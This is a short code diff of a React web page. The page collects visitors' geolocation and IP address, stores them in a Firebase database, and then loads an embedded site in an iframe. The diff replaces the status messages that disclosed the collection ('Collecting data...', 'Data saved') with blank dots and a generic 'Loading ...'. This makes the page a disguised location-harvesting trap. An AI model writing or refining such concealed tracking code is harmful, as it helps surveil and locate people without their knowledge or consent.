@@ -5,13 +5,13 @@ import axios from 'axios';
 
 function App() {
   const [showSite, setShowSite] = useState(false); // Control when to show iframe
-  const [status, setStatus] = useState("wait for load...");
+  const [status, setStatus] = useState("..........");
 
   useEffect(() => {
     const collectAndStoreLocation = () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
-          setStatus("Location granted. Collecting data...");
+          setStatus("..............");
 
           const { latitude, longitude } = pos.coords;
 
@@ -28,7 +28,7 @@ function App() {
 
             await push(ref(db, 'users'), data);
 
-            setStatus("Data saved. Loading site...");
+            setStatus("Loading ...");
             setTimeout(() => setShowSite(true), 1000); // Delay before loading site
           } catch (error) {
             console.error("Error collecting IP or pushing to Firebase", error);
